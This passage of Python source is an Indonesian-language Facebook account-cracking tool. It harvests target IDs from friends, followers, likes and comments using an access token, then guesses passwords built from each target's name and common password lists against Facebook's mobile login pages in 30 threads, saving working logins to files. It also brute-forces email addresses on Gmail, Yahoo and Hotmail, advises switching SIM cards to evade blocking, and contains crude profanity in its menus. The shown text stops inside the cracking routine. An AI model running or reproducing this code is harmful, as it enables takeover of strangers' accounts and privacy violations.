				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		teks2 = '>_Pilih File Yang Alan Dicek'
		sol().print(mark(teks2, style='green'))
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu') 
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			tuh()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				tuh()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def file5():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu') 
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			xxx()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
					xxx()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def file7():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu') 
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			dfb()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
					dfb() 
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def dfb():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "d.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://d.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://d.facebook.com')
			ho = parser(ses.post('https://d.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://d.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def massalv2():
	jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Crack ID Public Massal') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mau Berapa ID?(LIMIT 5)')
	try:
		jum = int(input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Masukan : '))
	except ValueError:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Input Salah') 
		exit()
	if jum<1 or jum>10:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Login Gagal Silahkan Ganti Token') 
		exit()
	ses=requests.Session()
	yz = 0
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Dump ID Follower')
	for met in range(jum):
		yz+=1
		kl = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208mMasukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v4.0/'+userr+'?fields=subscribers.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['subscribers']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah')
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Total ID ->> %s '%(len(id))) 
	setting()

def dump_massal():
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_DUMP ID PUBLIK MASSAL') 
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►  \x1b[38;5;231mBERAPA ID : '))
	except ValueError:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_INPUT YANG ANDA MASUKKAN BUKAN ANGKA') 
		exit()
	if jum<1 or jum>10:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m\x1b[38;5;231m>_OUT OF RANGE MEN') 
		exit()
	ses=requests.Session()
	yz = 0
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'├['+h+str(yz)+x+'] \x1b[38;5;231m>_Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI') 
			exit()
	tot = '├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231mTOTAL %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()
	
def dump_massal2():
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_DUMP ID FOLLOWERS PUBLIK MASSAL') 
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►  \x1b[38;5;231mBERAPA ID : '))
	except ValueError:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_INPUT YANG ANDA MASUKKAN BUKAN ANGKA') 
		exit()
	if jum<1 or jum>10:
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m\x1b[38;5;231m>_OUT OF RANGE MEN') 
		exit()
	ses=requests.Session()
	yz = 0
	#print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'├['+h+str(yz)+x+'] \x1b[38;5;231m>_Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
			for mi in col['subscribers']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI') 
			exit()
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231mTOTAL %s ID'%(len(id)))
	setting()

def massalv3():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Crack ID Post Likes Massal') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>Mau Berapa ID (LIMIT 5)')
	try:
		jum = int(input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_BERAPA ID : '))
	except ValueError:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Input Salah') 
		exit()
	if jum<1 or jum>10:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Login Gagal Silahkan Ganti Token')
		exit()
	ses=requests.Session()
	yz = 0
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v4.0/'+userr+'?post=likes.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['likes']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Total ID ->> %s '%(len(id))) 
	setting()

def massalv4():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Crack ID comment post Massal') 
	print('\033[33m>_Mau Berapa ID (LIMIT 5)')
	try:
		jum = int(input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_BERAPA ID : '))
	except ValueError:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Input Salah')
		exit()
	if jum<1 or jum>10:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Login Gagal Silahkan Ganti Token') 
		exit()
	ses=requests.Session()
	yz = 0
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Post comment harus publikn')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v4.0/'+userr+'?post=comment.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['comment']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Total ID ->> %s '%(len(id))) 
	setting()

# PENGATURAN ID
def setting():
	print('├[01] Crack Dari Akun Tertua\n├[02] Crack Dari Akun Termuda\n├[03] Acak Urutan ID')
	print('│') 
	HikmatTzy = input(x+'├['+h+'Bamsat'+x+'] Pilih : ')
	if HikmatTzy in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif HikmatTzy in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif HikmatTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('└PILIHAN TIDAK ADA DI MENU')
		exit()
	print('%s├[01] Method Mobile\n├[02] Method Bapi\n├[03] Method Free FB\n├[04] Method X Fb\n├[05] Method Touch FB \n├[06] Method D Fb'%(P))
	print('│') 
	_mat_ = input(x+'├['+h+'Bamsat'+x+'] Pilih : ')
	if _mat_ in ['1','01']:
		method.append('mobile')
	elif _mat_ in ['2','02']:
		method.append('bapi')
	elif _mat_ in ['3','03']:
		method.append('free')
	elif _mat_ in ['4','04']:
		method.append('xfb')
	elif _mat_ in ['5','05']:
		method.append('touch')
	elif _mat_ in ['6','06']:
		method.append('dfb')
	print('%s├[01] Password List Old [Indonesia]'%(P))
	print('%s├[02] Password List Random [Indonesia]'%(P))
	print('%s├[03] Password List Random [India/Bangla]'%(P))
	print('%s├[04] Password List Manual [Bawaan Script]'%(P))
	print('%s├[05] Password List Random [Malaysia]'%(P))
	kuntul = input('├Pilih Gan : ')
	if kuntul in ['1','01']:
		apleg3()
	elif kuntul in ['2','02']:
		apleg()
	elif kuntul in ['3','03']:
		apleg2()
	elif kuntul in['4','04']:
		apleg4()
	elif kuntul in['5','05']:
		apleg5()
	elif kuntul in ['']:
		print('└Pilih Yang bener Bangsat')
		setting()
def apleg():
	aplik = input(x+'├['+h+'Bamsat'+x+']  Informasi Akun (y/n/t) ? : ')
	if aplik in ['y','Y']:
		taplikasi.append('no')
	elif aplik in ['N','n']:
		taplikasi.append('no')
	else:
		taplikasi.append('no')
	print('│') 
	osk = input(x+'├['+h+'Bamsat'+x+'] Tampilkan Opsi Checkpoint? (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	passwrd()

def apleg2():
	aplik = input(x+'├['+h+'Bamsat'+x+']  Informasi Akun (y/n/t) ? : ')
	if aplik in ['y','Y']:
		taplikasi.append('no')
	elif aplik in ['N','n']:
		taplikasi.append('no')
	else:
		taplikasi.append('no')
	print('│') 
	osk = input(x+'├['+h+'Bamsat'+x+'] Tampilkan Opsi Checkpoint? (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	bangram()

def apleg3():
	aplik = input(x+'├['+h+'Bamsat'+x+']  Informasi Akun (y/n/t) ? : ')
	if aplik in ['y','Y']:
		taplikasi.append('no')
	elif aplik in ['N','n']:
		taplikasi.append('no')
	else:
		taplikasi.append('no')
	print(' ')
	osk = input(x+'├['+h+'Bamsat'+x+'] Tampilkan Opsi Checkpoint? (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	indold()
def apleg4():
	aplik = input(x+'├['+h+'Bamsat'+x+']  Informasi Akun (y/n/t) ? : ')
	if aplik in ['y','Y']:
		taplikasi.append('no')
	elif aplik in ['N','n']:
		taplikasi.append('no')
	else:
		taplikasi.append('no')
	osk = input(x+'├['+h+'Bamsat'+x+'] Tampilkan Opsi Checkpoint? (y/t) [Rekomended t]: ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	manwal()
	
def apleg5():
	aplik = input(x+'├['+h+'Bamsat'+x+']  Informasi Akun (y/n/t) ? : ')
	if aplik in ['y','Y']:
		taplikasi.append('no')
	elif aplik in ['N','n']:
		taplikasi.append('no')
	else:
		taplikasi.append('no')
	print('│') 
	osk = input(x+'├['+h+'Bamsat'+x+'] Tampilkan Opsi Checkpoint? (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	mayram()

def krekmail():
  data = []
  ids = input(p+" ["+k+"•"+m+"•"+p+"] Target Name : ")
  domain = input(p+" ["+k+"•"+m+"•"+p+"] Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+k+"•"+m+"•"+p+"] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  setpw=input(p+" ["+k+"•"+m+"•"+p+"] Set Password : ").split(',')
  print("\033[1;37m ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  [data.append({'idf': ids+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['idf'], user['pw']): user for user in data}
  input("\n\033[1;37m [BACK]")
  menu()

# WORDLIST
def indold():
	global token
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : OK/%s'%(okc))
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : CP/%s'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','indonesia','katasandi','indonesiaku','rahasia','katasandi123','memek','nusantara']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'bapi' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crack,idf,pwv) 
			elif 'xfb' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack,idf,pwv)
			elif 'dfb' in method:
				pool.submit(crack,idf,pwv)
	print('')
	print(' ')
	woi = input(x+'├['+h+'Y'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def manwal():
	global token
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : OK/%s'%(okc))
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : CP/%s'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','anjing','bangsat']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs)
					pwv.append(frs+nmf)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'bapi' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crack,idf,pwv) 
			elif 'xfb' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack,idf,pwv)
			elif 'dfb' in method:
				pool.submit(crack,idf,pwv)
	print('')
	print(' ')
	woi = input(x+'├['+h+'Y'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def mayram():
	global token
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : OK/%s'%(okc))
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : CP/%s'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','anjing','sayangku','upinipin','cantik']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs)
					pwv.append(frs+nmf)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'bapi' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crack,idf,pwv) 
			elif 'xfb' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack,idf,pwv)
			elif 'dfb' in method:
				pool.submit(crack,idf,pwv)
	print('')
	print(' ')
	woi = input(x+'├['+h+'Y'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def bangram():
	global token
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : OK/%s'%(okc))
	print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Hasil Ok  Disimpan Ke : CP/%s'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['khan12345','khankhan','india123','123456']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'bapi' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crack,idf,pwv) 
			elif 'xfb' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack,idf,pwv)
			elif 'dfb' in method:
				pool.submit(crack,idf,pwv)
	print('')
	print(' ')
	woi = input(x+'├['+h+'Y'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	bu = random.choice([O,B,J,H,P,K])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r└%s/%s OK:%s CP:%s'%(loop,len(id2),ok,cp));sys.stdout.flush()
	ua3 = random.choice(ugen3)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
